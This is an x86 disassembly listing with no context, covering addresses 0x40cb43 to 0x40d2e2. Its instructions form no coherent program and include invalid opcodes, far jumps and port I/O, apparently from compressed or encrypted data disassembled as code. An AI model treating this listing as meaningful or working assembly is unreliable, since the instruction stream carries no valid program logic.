  40cb43:	xchg   edx,eax
  40cb44:	fist   WORD PTR [esi+0x68]
  40cb47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb48:	das    
  40cb49:	xor    DWORD PTR [eax+0x1b],0x2cbc61b0
  40cb50:	fsubr  DWORD PTR [eax]
  40cb52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb53:	push   ecx
  40cb54:	jo     0x40cbbe
  40cb56:	push   esp
  40cb57:	fbld   TBYTE PTR [edi+0x24d23483]
  40cb5d:	add    al,0x92
  40cb5f:	mov    esi,0x14930af6
  40cb64:	jl     0x40cb31
  40cb66:	test   DWORD PTR [eax],eax
  40cb68:	adc    bh,BYTE PTR [ecx-0x16]
  40cb6b:	xchg   esi,eax
  40cb6c:	call   0xb114:0x828e907
  40cb73:	push   esp
  40cb74:	retf   
  40cb75:	ss jmp 0x40cb81
  40cb78:	adc    eax,0x41325f1d
  40cb7d:	test   eax,0xc03d031c
  40cb82:	jbe    0x40cb0d
  40cb84:	int    0xd3
  40cb86:	jnp    0x40cb6d
  40cb88:	call   0x6954:0xf663ba5e
  40cb8f:	shr    BYTE PTR [eax+0xd1f7d63],cl
  40cb95:	xor    DWORD PTR [edx+ebx*1+0x57],eax
  40cb99:	mov    esi,0xb0027e89
  40cb9e:	ret    0x7a36
  40cba1:	jbe    0x40cb8f
  40cba3:	mov    DWORD PTR [ecx+0x7ecc62a9],esp
  40cba9:	adc    eax,0x32448ea6
  40cbae:	mov    ecx,0xb6a9a908
  40cbb3:	and    BYTE PTR [eax-0x20],0xff
  40cbb7:	fsub   DWORD PTR ds:0xe5643347
  40cbbd:	jo     0x40cbc8
  40cbbf:	xor    BYTE PTR [edi],0x4c
  40cbc2:	cld    
  40cbc3:	mov    ebp,0xed442223
  40cbc8:	enter  0x7079,0xf
  40cbcc:	mov    BYTE PTR [ebx*2+0x680af6a9],dh
  40cbd3:	cmp    al,0x5e
  40cbd5:	fwait
  40cbd6:	std    
  40cbd7:	mov    ah,0xd2
  40cbd9:	sbb    al,cl
  40cbdb:	sbb    esp,eax
  40cbdd:	adc    eax,0x8bd758ff
  40cbe2:	lods   al,BYTE PTR ds:[esi]
  40cbe3:	stos   BYTE PTR es:[edi],al
  40cbe4:	pop    eax
  40cbe5:	cdq    
  40cbe6:	in     eax,0x16
  40cbe8:	add    eax,0x3449fe0
  40cbed:	or     DWORD PTR [ecx+edx*2+0x4b],esp
  40cbf1:	pop    ebx
  40cbf2:	imul   edi,DWORD PTR [ebx-0x47],0x2aa6bc2d
  40cbf9:	or     DWORD PTR [eax-0xc0e6f95],ebx
  40cbff:	call   0x6a3a9710
  40cc04:	mov    dh,0x2
  40cc06:	dec    ebp
  40cc07:	jle    0x40cbf1
  40cc09:	repnz shr eax,1
  40cc0c:	aad    0x3b
  40cc0e:	adc    BYTE PTR [edx+0x1f34e28c],cl
  40cc14:	or     ch,BYTE PTR [ebx+esi*8+0x3c66c293]
  40cc1b:	addr16 jl 0x40cbc4
  40cc1e:	or     edi,DWORD PTR [eax]
  40cc20:	cmp    DWORD PTR [esi+0x1a],eax
  40cc23:	retf   
  40cc24:	pop    esp
  40cc25:	jp     0x64d9d888
  40cc2b:	daa    
  40cc2c:	sti    
  40cc2d:	fwait
  40cc2e:	outs   dx,DWORD PTR ds:[esi]
  40cc2f:	mov    ah,0x74
  40cc31:	xchg   ebp,eax
  40cc32:	mov    ecx,DWORD PTR [eax+esi*1+0x1e]
  40cc36:	call   0xd5c4:0xb06ee10b
  40cc3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc3e:	jmp    0x40cc6e
  40cc40:	mov    edi,0x6f7aca72
  40cc45:	or     DWORD PTR [esi+0x12],edx
  40cc48:	add    dh,bl
  40cc4a:	mov    ecx,0xb50ba4d5
  40cc4f:	pop    eax
  40cc50:	push   ds
  40cc51:	retf   0x3a28
  40cc54:	jb     0x40cc68
  40cc56:	dec    ebp
  40cc57:	push   es
  40cc58:	sub    BYTE PTR [esp+esi*4],0x77
  40cc5c:	or     BYTE PTR [edx+eiz*1],bh
  40cc5f:	add    DWORD PTR [ecx+0x6e0e7e1e],ebp
  40cc65:	loope  0x40ccd4
  40cc67:	add    ebp,DWORD PTR [ebx-0x7a]
  40cc6a:	test   al,0xa4
  40cc6c:	and    eax,0x536860a2
  40cc71:	pushf  
  40cc72:	push   ebp
  40cc73:	pop    eax
  40cc74:	or     BYTE PTR [eax+esi*4+0x10d05a36],0x9
  40cc7c:	or     al,0x9f
  40cc7e:	aam    0x21
  40cc80:	clc    
  40cc81:	xchg   BYTE PTR [ebx+0x61287ae2],ah
  40cc87:	into   
  40cc88:	(bad)  
  40cc89:	mov    ebx,0x7a2d45a9
  40cc8e:	lahf   
  40cc8f:	xor    ebx,DWORD PTR [ecx-0x6a]
  40cc92:	repnz inc ecx
  40cc94:	jne    0x40cc83
  40cc96:	pop    ecx
  40cc97:	pop    esp
  40cc98:	ja     0x40cc35
  40cc9a:	push   ebx
  40cc9b:	xor    DWORD PTR [edi-0x527e0825],esp
  40cca1:	xor    bl,BYTE PTR [esi]
  40cca3:	adc    BYTE PTR [edi+0x12cdf2ac],bh
  40cca9:	retf   
  40ccaa:	sub    eax,0xadc019ec
  40ccaf:	add    esp,ebx
  40ccb1:	cmc    
  40ccb2:	pop    esi
  40ccb3:	into   
  40ccb4:	sbb    eax,0xf0a6726d
  40ccb9:	je     0x40cd20
  40ccbb:	fs and al,0x91
  40ccbe:	loopne 0x40cd0c
  40ccc0:	jg     0x40cc78
  40ccc2:	std    
  40ccc3:	mov    ebp,0x77c4ec61
  40ccc8:	mov    bl,0xfd
  40ccca:	xchg   ebp,eax
  40cccb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cccc:	bound  ecx,QWORD PTR [ebx+0x3b8af74d]
  40ccd2:	(bad)  
  40ccd3:	in     al,0xd6
  40ccd5:	pop    ss
  40ccd6:	js     0x40cd37
  40ccd8:	xlat   BYTE PTR ds:[ebx]
  40ccd9:	sub    cl,bh
  40ccdb:	jae    0x40cc83
  40ccdd:	popf   
  40ccde:	pop    ecx
  40ccdf:	mov    ebp,0x6c3d3092
  40cce4:	adc    dh,BYTE PTR [esi]
  40cce6:	sbb    DWORD PTR [ebp-0x55b69bc],edx
  40ccec:	jmp    0x40ccf7
  40ccee:	xchg   ecx,eax
  40ccef:	loope  0x40cd2f
  40ccf1:	or     dh,bl
  40ccf3:	pusha  
  40ccf4:	inc    edx
  40ccf5:	or     ebx,DWORD PTR [eax+0x48]
  40ccf8:	adc    ecx,DWORD PTR [esi+0x5f]
  40ccfb:	mov    esp,0x5a44a995
  40cd00:	in     eax,0x5b
  40cd02:	push   eax
  40cd03:	fs or  ah,dh
  40cd06:	mov    WORD PTR [esi-0x34],fs
  40cd09:	repz jae 0x40ccb4
  40cd0c:	(bad)  
  40cd0d:	shl    DWORD PTR [ecx],1
  40cd0f:	cli    
  40cd10:	jp     0x40ccd0
  40cd12:	push   ebx
  40cd13:	addr16 repnz (bad) 
  40cd16:	shl    BYTE PTR [ebp-0x44],cl
  40cd19:	mov    dh,0xb0
  40cd1b:	sbb    DWORD PTR [esi],ebx
  40cd1d:	cwde   
  40cd1e:	and    DWORD PTR [esi-0x7e56c167],edx
  40cd24:	push   0x4d
  40cd26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd27:	dec    edi
  40cd28:	enter  0x19bd,0x82
  40cd2c:	jg     0x40cd1a
  40cd2e:	int    0xd9
  40cd30:	les    eax,FWORD PTR [ecx]
  40cd32:	and    dh,ch
  40cd34:	dec    esi
  40cd35:	lahf   
  40cd36:	mov    al,0xe
  40cd38:	cmp    al,0x16
  40cd3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd3b:	inc    esp
  40cd3c:	call   0xf5f7:0x848ef28b
  40cd43:	lds    eax,FWORD PTR [ecx-0x3129835a]
  40cd49:	sub    esp,ecx
  40cd4b:	aam    0x6f
  40cd4d:	xchg   ebx,eax
  40cd4e:	inc    edx
  40cd4f:	jmp    0xfd8:0x318ec13
  40cd56:	xor    BYTE PTR [esp+eiz*2-0x6a970ab0],ah
  40cd5d:	imul   ecx,DWORD PTR [edi],0xffffff83
  40cd60:	xor    cl,ah
  40cd62:	not    BYTE PTR [esi-0x68]
  40cd65:	out    dx,al
  40cd66:	std    
  40cd67:	and    dh,BYTE PTR ds:[ebx+edi*8+0x74dd14b5]
  40cd6f:	pop    esi
  40cd70:	dec    edi
  40cd71:	sub    al,0x12
  40cd73:	shl    DWORD PTR cs:[ecx+0x3c32562b],1
  40cd7a:	inc    esp
  40cd7b:	sub    al,0x1d
  40cd7d:	data16 adc al,0x16
  40cd80:	cmp    edi,DWORD PTR [edi-0x10ee3c97]
  40cd86:	and    edi,0x5a94ef3d
  40cd8c:	add    BYTE PTR [edi-0x70],ch
  40cd8f:	rcr    DWORD PTR [edi+0x2528360f],cl
  40cd95:	icebp  
  40cd96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd97:	popf   
  40cd98:	push   ss
  40cd99:	mov    ecx,edx
  40cd9b:	and    al,0xb4
  40cd9d:	add    eax,0x9ce89506
  40cda2:	(bad)  
  40cda3:	daa    
  40cda4:	outs   dx,DWORD PTR ds:[esi]
  40cda5:	(bad)  [ebp-0x5fc6c0af]
  40cdab:	neg    DWORD PTR [ecx+0x1b]
  40cdae:	pop    ds
  40cdaf:	jae    0x40cda7
  40cdb1:	in     al,dx
  40cdb2:	xchg   BYTE PTR [ecx+eax*2+0x41],ah
  40cdb6:	adc    bl,ch
  40cdb8:	jnp    0x40cdd4
  40cdba:	imul   eax,ecx,0xb13a8137
  40cdc0:	mov    dl,0x51
  40cdc2:	inc    edx
  40cdc3:	and    eax,0x61f44be0
  40cdc8:	adc    al,0xa4
  40cdca:	push   0x67
  40cdcc:	sbb    ebp,DWORD PTR [eax]
  40cdce:	rcl    DWORD PTR [edx+0x2c0278f6],cl
  40cdd4:	dec    ebx
  40cdd5:	lock test ch,bh
  40cdd8:	xor    bl,cl
  40cdda:	in     al,0x3b
  40cddc:	and    ebp,DWORD PTR [ebx-0x47]
  40cddf:	dec    ecx
  40cde0:	adc    ecx,DWORD PTR [esp+edi*1]
  40cde3:	lea    eax,[esi*4-0x79f09dcd]
  40cdea:	pop    esi
  40cdeb:	jl     0x40cdd8
  40cded:	inc    ebx
  40cdee:	test   al,0x98
  40cdf0:	mov    cl,0x87
  40cdf2:	setne  BYTE PTR [ecx]
  40cdf5:	inc    esi
  40cdf6:	cmp    ah,ch
  40cdf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cdf9:	pushf  
  40cdfa:	test   DWORD PTR [ebx+0x1830f6f4],ebx
  40ce00:	dec    esp
  40ce01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce02:	js     0x40cdae
  40ce04:	pop    esp
  40ce05:	jmp    0xd005c598
  40ce0a:	xchg   edi,eax
  40ce0b:	mov    dl,0xa1
  40ce0d:	or     BYTE PTR [eax-0x50],bh
  40ce10:	enter  0xb884,0xf
  40ce14:	repnz pushw es
  40ce17:	xchg   edi,ebp
  40ce19:	jnp    0x40cdc2
  40ce1b:	(bad)  
  40ce1c:	mov    al,BYTE PTR [ebx+0x18db57e7]
  40ce22:	sbb    BYTE PTR [ecx-0x75a16c3d],dl
  40ce28:	in     al,dx
  40ce29:	xchg   DWORD PTR [ebx],ecx
  40ce2b:	push   cs
  40ce2c:	add    al,0x26
  40ce2e:	mov    WORD PTR [esi],cs
  40ce30:	repnz iret 
  40ce32:	adc    BYTE PTR [edi+0x55],dl
  40ce35:	sbb    al,0x3b
  40ce37:	pop    ds
  40ce38:	cmp    ebx,DWORD PTR [edi+0x58f0acd0]
  40ce3e:	jb     0x40cddb
  40ce40:	jl     0x40ce48
  40ce42:	and    al,ah
  40ce44:	loope  0x40ceac
  40ce46:	sbb    al,0x1d
  40ce48:	jg     0x40ce9e
  40ce4a:	mov    edx,DWORD PTR [eax-0x31]
  40ce4d:	data16 out 0x5d,al
  40ce50:	popf   
  40ce51:	jmp    0x40ce02
  40ce53:	call   0xf5d6bfa0
  40ce58:	lods   al,BYTE PTR ds:[esi]
  40ce59:	les    esp,FWORD PTR [ebp+0x4630604f]
  40ce5f:	fcomp  QWORD PTR [eax]
  40ce61:	sbb    dh,BYTE PTR [edi]
  40ce63:	sti    
  40ce64:	ror    dh,1
  40ce66:	shr    bl,1
  40ce68:	pop    ebp
  40ce69:	dec    esp
  40ce6a:	add    DWORD PTR [esi],edx
  40ce6c:	add    al,0xa0
  40ce6e:	bound  ebp,QWORD PTR [eax+0x76edfa32]
  40ce74:	mov    ss,WORD PTR [edx-0x970e5fc]
  40ce7a:	mov    al,ds:0x8d9fc209
  40ce7f:	les    ecx,FWORD PTR [esi+0xb]
  40ce82:	sbb    al,0x25
  40ce84:	add    ebx,DWORD PTR [edx+0x27]
  40ce87:	push   ebx
  40ce88:	xlat   BYTE PTR ds:[ebx]
  40ce89:	mov    BYTE PTR [esp+esi*1+0x6664aa10],ah
  40ce90:	cmp    eax,0x990a8734
  40ce95:	inc    edi
  40ce96:	cmp    ebp,esi
  40ce98:	stc    
  40ce99:	mov    edx,0x620e8f43
  40ce9e:	daa    
  40ce9f:	dec    ebx
  40cea0:	fdiv   QWORD PTR ds:0x727c92c5
  40cea6:	pop    ebp
  40cea7:	push   ebx
  40cea8:	sub    BYTE PTR [ebp-0x7f489ece],dh
  40ceae:	mov    dl,0x72
  40ceb0:	js     0x40ceb5
  40ceb2:	adc    ebx,DWORD PTR ds:0x3ab00159
  40ceb8:	hlt    
  40ceb9:	div    DWORD PTR ds:0xefde8a6a
  40cebf:	and    DWORD PTR [ecx],ebp
  40cec1:	mov    esp,0x87c1794c
  40cec6:	add    eax,DWORD PTR [ecx+esi*1+0x4fbd42bd]
  40cecd:	stos   BYTE PTR es:[edi],al
  40cece:	es mov esi,ebp
  40ced1:	stc    
  40ced2:	inc    ebp
  40ced3:	mov    bh,0xc2
  40ced5:	out    0xe8,al
  40ced7:	jl     0x40ceaa
  40ced9:	jne    0x40ce94
  40cedb:	popf   
  40cedc:	div    DWORD PTR [eax+0x18]
  40cedf:	das    
  40cee0:	ret    0xd9bc
  40cee3:	xchg   edx,eax
  40cee4:	pop    ss
  40cee5:	or     esp,DWORD PTR [edi+0x56828af1]
  40ceeb:	mov    eax,ds:0x6a9bc0d6
  40cef0:	dec    ebp
  40cef1:	test   al,0xbc
  40cef3:	pusha  
  40cef4:	mov    cl,0x9a
  40cef6:	xor    DWORD PTR [edx],esp
  40cef8:	xchg   esi,eax
  40cef9:	lods   al,BYTE PTR ds:[esi]
  40cefa:	sbb    al,0x19
  40cefc:	or     edi,ebx
  40cefe:	pop    ds
  40ceff:	loope  0x40ceaa
  40cf01:	in     eax,0x3
  40cf03:	cmp    al,0xf2
  40cf05:	sub    cl,BYTE PTR [eax-0x4a]
  40cf08:	jae    0x40ce9f
  40cf0a:	mov    ds:0x4854aaba,eax
  40cf0f:	cld    
  40cf10:	mov    ds:0xa2d509e,eax
  40cf15:	and    bh,BYTE PTR ds:[edx-0xb43ceaa]
  40cf1c:	ins    BYTE PTR es:[edi],dx
  40cf1d:	sub    DWORD PTR [edi+edi*8+0x6662092e],ebp
  40cf24:	ja     0x40cfa0
  40cf26:	dec    edi
  40cf27:	mov    edx,0x33e7153e
  40cf2c:	jge    0x40cf0a
  40cf2e:	xchg   ebp,eax
  40cf30:	add    dl,BYTE PTR ds:0x9f99684
  40cf36:	daa    
  40cf37:	push   ebx
  40cf38:	mov    cl,0x93
  40cf3a:	cmp    edx,edi
  40cf3c:	test   eax,0x3344c2fa
  40cf41:	sti    
  40cf42:	(bad)  
  40cf43:	repnz dec eax
  40cf45:	and    edi,ebp
  40cf47:	sub    DWORD PTR [esi],edx
  40cf49:	ss loop 0x40cfa9
  40cf4c:	sub    eax,0xfb9149e4
  40cf51:	icebp  
  40cf52:	mov    dh,0xac
  40cf54:	add    BYTE PTR [eax],cl
  40cf56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf57:	sub    DWORD PTR [eax+edx*8+0x5b808b3c],esp
  40cf5e:	jg     0x40cf10
  40cf60:	ret    0x899
  40cf63:	mov    ds:0x9844b4e3,eax
  40cf68:	dec    esi
  40cf69:	lods   eax,DWORD PTR ds:[esi]
  40cf6a:	scas   al,BYTE PTR es:[edi]
  40cf6b:	test   eax,0x541b8329
  40cf70:	ja     0x40cfb6
  40cf72:	mov    ecx,0x97697720
  40cf77:	or     DWORD PTR [esi+0xc],0xffffffa5
  40cf7b:	and    esp,DWORD PTR [ebp+ecx*2-0x24]
  40cf7f:	mov    bl,0x77
  40cf81:	sbb    DWORD PTR [eax],ebp
  40cf83:	mov    BYTE PTR [eax],al
  40cf85:	fistp  WORD PTR [ebx+0x6ffb33f4]
  40cf8b:	mov    eax,0x392f7c28
  40cf90:	mov    edi,0x6290b590
  40cf95:	sub    BYTE PTR [edi-0x24a9657b],bh
  40cf9b:	sub    esp,DWORD PTR [ebp+0x71]
  40cf9e:	and    DWORD PTR [ebx+0x196ba7bd],edi
  40cfa4:	cli    
  40cfa5:	test   al,0x6b
  40cfa7:	and    eax,DWORD PTR [edx+0x23]
  40cfaa:	lods   al,BYTE PTR ds:[esi]
  40cfab:	je     0x40cfdf
  40cfad:	gs cmp esp,ebp
  40cfb0:	outs   dx,DWORD PTR ds:[esi]
  40cfb1:	sub    eax,0x1c250960
  40cfb6:	in     eax,0xef
  40cfb8:	addr16 call 0x156c:0x7f875e3a
  40cfc0:	push   ds
  40cfc1:	(bad)
  40cfc4:	mov    al,0xd4
  40cfc6:	sbb    bh,BYTE PTR [ebp-0x16]
  40cfc9:	xchg   edi,eax
  40cfca:	(bad)  
  40cfcc:	inc    edx
  40cfcd:	iret   
  40cfce:	push   ss
  40cfcf:	in     al,0x2c
  40cfd1:	sbb    eax,0x7c2e0f68
  40cfd6:	out    0xb0,eax
  40cfd8:	icebp  
  40cfd9:	sbb    eax,0x710fb34b
  40cfde:	mov    dl,0x7
  40cfe0:	jmp    0x804e:0xb18b7f02
  40cfe7:	ret    
  40cfe8:	push   cs
  40cfe9:	jmp    FWORD PTR [eax-0x6e19ca85]
  40cfef:	leave  
  40cff0:	dec    eax
  40cff1:	mov    esi,0x3cb03d9a
  40cff6:	in     eax,dx
  40cff7:	inc    edx
  40cff8:	mov    al,ds:0x79eaf6b7
  40cffd:	lea    ecx,ss:[ecx]
  40d000:	inc    ebp
  40d001:	out    0xb3,eax
  40d003:	(bad)  
  40d004:	and    bh,BYTE PTR ds:0x2191d84b
  40d00a:	cmp    eax,0xfadb1d6
  40d00f:	mov    ah,0x50
  40d011:	push   0x3e
  40d013:	sub    eax,DWORD PTR [eax-0x5c]
  40d016:	jb     0x40d042
  40d018:	mov    DWORD PTR [esi-0x139f373e],ebp
  40d01e:	push   ss
  40d01f:	add    eax,0xaca0d573
  40d024:	adc    al,0xd4
  40d026:	mov    cl,0x63
  40d028:	(bad)  
  40d029:	pop    edx
  40d02a:	dec    ecx
  40d02b:	fistp  WORD PTR [ecx-0x2afb934c]
  40d031:	fnstsw WORD PTR [eax]
  40d033:	inc    esp
  40d034:	mov    ds,WORD PTR [edi-0x52]
  40d037:	inc    esp
  40d038:	ret    0x4f24
  40d03b:	push   ecx
  40d03c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d03d:	jbe    0x40d044
  40d03f:	jne    0x40d067
  40d041:	test   al,0xa4
  40d043:	lahf   
  40d044:	es and bh,cl
  40d047:	aam    0x54
  40d049:	cmp    DWORD PTR [ecx+0x5b6944bf],ebp
  40d04f:	jbe    0x40d0cc
  40d051:	fwait
  40d052:	(bad)  
  40d053:	fstp   TBYTE PTR [edi+edx*2+0x6a]
  40d057:	adc    ah,BYTE PTR [esi]
  40d059:	jo     0x40d0a7
  40d05b:	push   edi
  40d05c:	push   0xffffffd6
  40d05e:	mov    DWORD PTR [esi],esp
  40d060:	mov    cl,0xcc
  40d062:	jp     0x40d058
  40d064:	push   ebx
  40d065:	pop    edx
  40d066:	xchg   DWORD PTR [esi],ecx
  40d068:	fiadd  DWORD PTR [eax]
  40d06a:	sbb    edx,edi
  40d06c:	ror    BYTE PTR [esi],cl
  40d06e:	or     eax,0x9834f9b0
  40d073:	or     ebx,DWORD PTR [ebp+0x4e]
  40d076:	jb     0x40d0b8
  40d078:	out    dx,eax
  40d079:	jne    0x40d0c1
  40d07b:	sbb    DWORD PTR [edi-0x4f],0x6ce5d1c7
  40d082:	jbe    0x40d0b7
  40d084:	mov    ebx,0xa648bcc6
  40d089:	cmp    edi,DWORD PTR [ebx+0x31]
  40d08c:	and    eax,0x25983f58
  40d091:	pop    ebx
  40d092:	push   edx
  40d093:	jl     0x40d10d
  40d095:	lea    edi,ds:0x615becd0
  40d09b:	mov    edi,0x99704a00
  40d0a0:	lods   al,BYTE PTR ds:[esi]
  40d0a1:	lea    edx,[edx+0x42f71248]
  40d0a7:	iret   
  40d0a8:	push   ecx
  40d0a9:	popf   
  40d0aa:	xor    BYTE PTR [eax+0x40442c82],bh
  40d0b0:	and    edx,esi
  40d0b2:	xchg   esi,eax
  40d0b3:	mov    WORD PTR [ebx+edx*1-0x4012ec40],gs
  40d0ba:	or     eax,0x1f1a5115
  40d0bf:	dec    edi
  40d0c0:	xchg   ebx,eax
  40d0c1:	(bad)  
  40d0c2:	jl     0x40d069
  40d0c4:	jnp    0x40d0af
  40d0c6:	xor    ah,BYTE PTR [edi+0x7d]
  40d0c9:	and    DWORD PTR [ebp-0x26],0x1c
  40d0cd:	push   ecx
  40d0ce:	data16 sbb bh,0x64
  40d0d2:	and    ch,bl
  40d0d4:	fs scas eax,DWORD PTR es:[edi]
  40d0d6:	mov    ecx,0xe74c8fcf
  40d0db:	sub    eax,0xcda9a0c5
  40d0e0:	daa    
  40d0e1:	sub    al,0xa8
  40d0e3:	adc    al,0x9b
  40d0e5:	aad    0x36
  40d0e7:	ss in  eax,dx
  40d0e9:	lods   eax,DWORD PTR ds:[esi]
  40d0ea:	fisttp WORD PTR [eax-0x352be175]
  40d0f0:	jae    0x40d141
  40d0f2:	xchg   ebp,esp
  40d0f4:	sub    BYTE PTR [edx+0x57943ede],bh
  40d0fa:	mov    ecx,DWORD PTR [esi]
  40d0fc:	cmp    ah,BYTE PTR [ecx-0x2b220726]
  40d102:	or     bh,BYTE PTR [ecx]
  40d104:	lods   eax,DWORD PTR ds:[esi]
  40d105:	mov    esp,0x2c9272da
  40d10a:	imul   ebx,esi,0xffffffe4
  40d10d:	aaa    
  40d10e:	ja     0x40d0cf
  40d110:	adc    bh,bh
  40d112:	adc    DWORD PTR [edi],esp
  40d114:	xor    bh,BYTE PTR [edx-0x3d]
  40d117:	ja     0x40d18b
  40d119:	xchg   DWORD PTR [ecx+0x53],ebp
  40d11c:	les    edx,FWORD PTR [eax-0x68d2ea4b]
  40d122:	pop    ebp
  40d123:	mov    DWORD PTR [ebx+0x16961b43],eax
  40d129:	loop   0x40d178
  40d12b:	icebp  
  40d12c:	aad    0xee
  40d12e:	(bad)
  40d133:	int    0x4e
  40d135:	loope  0x40d108
  40d137:	ss aam 0x73
  40d13a:	lds    esp,FWORD PTR [ecx+edx*4-0x3fe87813]
  40d141:	adc    edi,DWORD PTR [ecx-0x3efbcc4e]
  40d147:	dec    esi
  40d148:	sbb    al,0x63
  40d14a:	mov    esi,0x39a7ad08
  40d14f:	gs in  eax,dx
  40d151:	xor    eax,0x36d69bbf
  40d156:	cdq    
  40d157:	std    
  40d158:	inc    ebp
  40d159:	dec    edi
  40d15a:	fistp  WORD PTR [ebx-0x41cf5546]
  40d160:	jmp    0x40d13e
  40d162:	mov    edi,0x76dcd54d
  40d167:	enter  0x6d78,0x8e
  40d16b:	enter  0x2106,0xb2
  40d16f:	sbb    ebp,DWORD PTR [edi+0x3b6c707b]
  40d175:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d176:	and    dl,BYTE PTR [ecx+0x2c6ca62d]
  40d17c:	scas   eax,DWORD PTR es:[edi]
  40d17d:	test   ecx,edi
  40d17f:	out    0x7,eax
  40d181:	stos   BYTE PTR es:[edi],al
  40d182:	es jnp 0x40d1e5
  40d185:	sub    al,0x27
  40d187:	and    al,0x16
  40d189:	arpl   WORD PTR [eax+0x49],cx
  40d18c:	and    ebx,DWORD PTR [edx]
  40d18e:	ror    BYTE PTR [edi+0x52],cl
  40d191:	repnz add cl,ch
  40d194:	shr    DWORD PTR [eax+eax*1-0x4c],0xea
  40d199:	scas   al,BYTE PTR es:[edi]
  40d19a:	enter  0xc7dc,0x6f
  40d19e:	xlat   BYTE PTR ds:[ebx]
  40d19f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1a0:	bswap  edi
  40d1a2:	sub    edx,DWORD PTR ds:0x17bc08e1
  40d1a8:	dec    ecx
  40d1a9:	out    0xaf,eax
  40d1ab:	fnstenv [esi-0x63ac72a4]
  40d1b1:	adc    DWORD PTR [edi],edx
  40d1b3:	repnz loope 0x40d149
  40d1b6:	dec    eax
  40d1b7:	bound  ebp,QWORD PTR [ebp+0x6db2274]
  40d1bd:	icebp  
  40d1be:	mov    WORD PTR [edx+eiz*1+0x7056aa99],fs
  40d1c5:	scas   eax,DWORD PTR es:[edi]
  40d1c6:	jg     0x40d207
  40d1c8:	ret    0x400
  40d1cb:	outs   dx,DWORD PTR ds:[esi]
  40d1cc:	adc    al,0xc8
  40d1ce:	push   0x8
  40d1d0:	call   0x55e7:0xa793cf2c
  40d1d7:	mov    dl,0x4e
  40d1d9:	mov    ecx,0x9c916f57
  40d1de:	retf   0x3696
  40d1e1:	and    al,0x4f
  40d1e3:	ffree  st(6)
  40d1e5:	test   DWORD PTR [ebx],edi
  40d1e7:	aam    0xf5
  40d1e9:	adc    ecx,ecx
  40d1eb:	and    dl,BYTE PTR [eax]
  40d1ed:	xchg   ebp,eax
  40d1ee:	push   ds
  40d1ef:	shl    BYTE PTR [esi+0x71],0x64
  40d1f3:	push   ecx
  40d1f4:	or     eax,0xdcc98cf2
  40d1f9:	sahf   
  40d1fa:	aad    0x3b
  40d1fc:	ror    ah,0xe2
  40d1ff:	imul   ebp,eax,0x995f2a2b
  40d205:	pop    es
  40d206:	sbb    ah,dl
  40d208:	xor    eax,0xd7332cf2
  40d20d:	rol    DWORD PTR [ebx],1
  40d20f:	xchg   ecx,eax
  40d210:	and    eax,0x6c50cad8
  40d215:	(bad)  
  40d216:	(bad)  
  40d217:	sbb    dh,bh
  40d219:	aam    0xd5
  40d21b:	pop    ebx
  40d21c:	popa   
  40d21d:	add    eax,0xff989a1a
  40d222:	jae    0x40d240
  40d224:	les    ecx,FWORD PTR [ebp+ebp*2+0x6a1f6f12]
  40d22b:	dec    esp
  40d22c:	jmp    0x40d1fb
  40d22e:	dec    esi
  40d22f:	or     eax,0x57f08909
  40d234:	ins    DWORD PTR es:[edi],dx
  40d235:	scas   eax,DWORD PTR es:[edi]
  40d236:	xchg   esi,eax
  40d237:	adc    bh,BYTE PTR [esi+esi*2-0x3623d3ac]
  40d23e:	sub    DWORD PTR [eax+0x14],edx
  40d241:	ins    BYTE PTR es:[edi],dx
  40d242:	int    0x3e
  40d244:	shr    BYTE PTR [ebp+0x39],1
  40d247:	jo     0x40d249
  40d249:	mov    al,ds:0x49b6616f
  40d24e:	ja     0x40d242
  40d250:	and    DWORD PTR [eax],edx
  40d252:	sbb    esi,DWORD PTR [ecx]
  40d254:	out    dx,eax
  40d255:	mov    dh,0x2c
  40d257:	sti    
  40d258:	jmp    0x9fb:0xc3f5382b
  40d25f:	jl     0x40d240
  40d261:	mov    dl,0x46
  40d263:	repnz adc al,0xb8
  40d266:	fdivr  DWORD PTR [eax-0x1c]
  40d269:	call   0xd7962737
  40d26e:	fisttp WORD PTR [ebx+0x1051971e]
  40d274:	ret    0xd2df
  40d277:	iret   
  40d278:	sub    BYTE PTR [edi-0x5f36f2dd],0xe1
  40d27f:	mov    esi,0x8e7d329a
  40d284:	out    0x63,al
  40d286:	cmp    eax,0xa270c3aa
  40d28b:	daa    
  40d28c:	cdq    
  40d28d:	pop    edx
  40d28e:	int3   
  40d28f:	jge    0x40d2c2
  40d291:	lods   al,BYTE PTR ds:[esi]
  40d292:	icebp  
  40d293:	mov    cl,bl
  40d295:	push   ss
  40d296:	ja     0x40d21b
  40d298:	pop    ecx
  40d299:	dec    esi
  40d29a:	xor    DWORD PTR [ebx],eax
  40d29c:	jmp    0x85a6:0xada40c1a
  40d2a3:	retf   
  40d2a4:	mov    BYTE PTR [edx],bl
  40d2a6:	scas   eax,DWORD PTR es:[edi]
  40d2a7:	pushf  
  40d2a8:	retf   
  40d2a9:	inc    ebp
  40d2aa:	nop    DWORD PTR [eax+0x1b]
  40d2ae:	(bad)  
  40d2af:	retf   0x4688
  40d2b2:	hlt    
  40d2b3:	std    
  40d2b4:	add    al,0xcb
  40d2b6:	jl     0x40d256
  40d2b8:	xchg   edi,eax
  40d2b9:	or     esp,DWORD PTR [ebp-0x1f00ece0]
  40d2bf:	adc    eax,0xf44d01c3
  40d2c4:	push   eax
  40d2c5:	adc    bh,BYTE PTR [ebx-0x6]
  40d2c8:	fdiv   QWORD PTR [edx+ecx*2+0x2038cea5]
  40d2cf:	or     ebx,DWORD PTR [ecx+0x3a1c7d21]
  40d2d5:	inc    edx
  40d2d6:	jns    0x40d334
  40d2d8:	sbb    dl,al
  40d2da:	inc    ebx
  40d2db:	cmp    DWORD PTR [esi-0x710ebd4c],esp
  40d2e1:	(bad)  
  40d2e2:	pop    eax
